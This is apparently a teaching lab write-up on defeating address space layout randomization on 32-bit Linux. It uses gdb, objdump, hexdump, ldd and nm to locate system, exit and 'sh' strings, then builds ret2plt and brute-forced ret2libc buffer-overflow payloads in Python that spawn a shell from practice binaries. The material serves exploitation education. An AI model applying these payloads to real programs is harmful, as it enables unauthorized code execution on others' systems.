# Address Space Layout Randomization

-

## Return to PLT

### Sneak Preview

Let's first step into gdb and examine the `system@plt` function.

We found something like this at the very begining of the `system@plt` subroutine:

```bash
(gdb) x/24si 0x8048370
   0x8048370 <system@plt>:	    jmp    *0x804a014
   0x8048376 <system@plt+6>:	push   $0x10
```

It jumps to 0x804a014, let's see what's going on there:

```bash
(gdb) x/24si 0x804a014
   0x804a014 <system@got.plt>:	    jbe    0x8049f99
   0x804a016 <system@got.plt+2>:	add    $0x8,%al
```

It seems they are doing `system` address resolution.

### Logistics

Let's dissemble the binary!

```bash
vagrant@localhost:~/buffer_overruns/aslr$ objdump -M intel -D victim_r2p | grep 'system\|exit'
08048370 <system@plt>:
08048390 <exit@plt>:
 80484c8:	e8 a3 fe ff ff       	call   8048370 <system@plt>
 80484d4:	e8 b7 fe ff ff       	call   8048390 <exit@plt>
```

Next we would need the address of '/bin/sh' string in the binary:

```bash
vagrant@localhost:~/buffer_overruns/aslr$ hexdump -C -s 0x0 victim_r2p | grep '/bin/'
000005d0  2f 62 69 6e 2f 73 68 00  25 73 0a 00 01 1b 03 3b  |/bin/sh.%s.....;|
```

We know its offset is 0x000005d0. Sweet. We also know that as a default rule used by gnu linker, the text segment's base address is usually 0x400000 for 64 bit executables and 0x08048000 for 32 bit executables.

Thus we have the address for '/bin/sh': 0x08048000 + 0x000005d0 = 0x80485d0

We now have:

|Instruction/Value|Address|
|---|---|
|system@plt|0x8048370|
|exit@plt|0x8048390|
|"/bin/sh"|0x80485d0|

### Construct Payload

For this task, let's use a Python script to make our life easier!

```python

a_size = 36
system = 0x8048370
exit = 0x8048390
binsh = 0x80485d0
pointer_fmt = '<I'  # unsigned int (4 bytes)

buf = 'A' * a_size
buf += pack(pointer_fmt, system)
buf += pack(pointer_fmt, exit)
buf += pack(pointer_fmt, binsh)
```

Let's call it!

## Brute Force

### Find my argument

Since this time "/bin/sh" is no longer provided in the text, we could not use it for our malicious purpose :(

But wait! Someone was kind enough to put a `fflush` function there. "fflu......sh!"

That reminded me that in order to bring up a shell, we don't necessarily have to call `system("/bin/sh");`. `system("sh");` will do just as nice.

Let's find the address of "sh"!

```bash
vagrant@localhost:~/buffer_overruns/aslr$ hexdump -C -s 0x0 victim_bf | grep sh
00000260  5f 75 73 65 64 00 66 66  6c 75 73 68 00 73 74 72  |_used.fflush.str|
00001560  73 61 76 65 5f 65 6e 64  00 73 68 6f 72 74 20 69  |save_end.short i|
00001680  6b 65 72 00 5f 73 68 6f  72 74 62 75 66 00 5f 49  |ker._shortbuf._I|
000016b0  74 72 00 73 68 6f 72 74  20 75 6e 73 69 67 6e 65  |tr.short unsigne|
000017b0  00 2e 73 74 72 74 61 62  00 2e 73 68 73 74 72 74  |..strtab..shstrt|
000017f0  2e 68 61 73 68 00 2e 64  79 6e 73 79 6d 00 2e 64  |.hash..dynsym..d|
00002490  49 42 43 5f 32 2e 30 00  66 66 6c 75 73 68 40 40  |IBC_2.0.fflush@@|
```

We could extract the first ocurance where there's a tailing null -- 0x00000260 + 10 = 0x0000026a is the offset of "sh".

Now adding this to the text base address, we get:
0x0000026a + 0x08048000 = 0x0804826a

Note that this address won't change as the text segment does not move.

(Side note, there are other ways to obtain address of "sh" or even "/bin/sh". Try searching in GDB)

### Other logistics

Using pattern offset search, we found that the rubbish data we need is 32 bytes.

By running ldd a few times, we realized that the base address of libc.so has such a pattern `0xb75??000`.

```bash
agrant@localhost:~/buffer_overruns/aslr$ ldd ./victim_bf | grep libc.so
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c4000)
vagrant@localhost:~/buffer_overruns/aslr$ ldd ./victim_bf | grep libc.so
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb752b000)
vagrant@localhost:~/buffer_overruns/aslr$ ldd ./victim_bf | grep libc.so
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75b4000)
vagrant@localhost:~/buffer_overruns/aslr$ ldd ./victim_bf | grep libc.so
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb758f000)
vagrant@localhost:~/buffer_overruns/aslr$ ldd ./victim_bf | grep libc.so
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75df000)
vagrant@localhost:~/buffer_overruns/aslr$ ldd ./victim_bf | grep libc.so
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7566000)
vagrant@localhost:~/buffer_overruns/aslr$ ldd ./victim_bf | grep libc.so
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb758c000)
vagrant@localhost:~/buffer_overruns/aslr$ ldd ./victim_bf | grep libc.so
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7526000)
```

Thus in total we need to brute force two base 16 digits, namely 2 ^ 8 times.

Now let's find out the offset of `system` and `exit` symbols in the libc file:

```bash
vagrant@localhost:~/buffer_overruns/aslr$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep '\<system\>'
00040310 W system
vagrant@localhost:~/buffer_overruns/aslr$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep '\<exit\>'
00033260 T exit
```

Let's summarise!

|symbol|offset/address/count|
|---|---|
|system|0x00040310 (offset)|
|exit|0x00033260 (offset)|
|libc.so|0xb75??000 (base address)|
|"sh"|0x0804826a (abs address)|
|"A"s|32|

We will have our payload executor in a python script!

```python
mid = 0x8a000
libc_base = 0xb7500000
exit_offset = 0x00033260
system_offset = 0x00040310
sh_addr = 0x0804826a
a_size = 32
pointer_fmt = '<I'

buf = "A" * a_size
buf += pack(pointer_fmt, libc_base + mid + system_offset)
buf += pack(pointer_fmt, libc_base + mid + exit_offset)
buf += pack(pointer_fmt, sh_addr)
```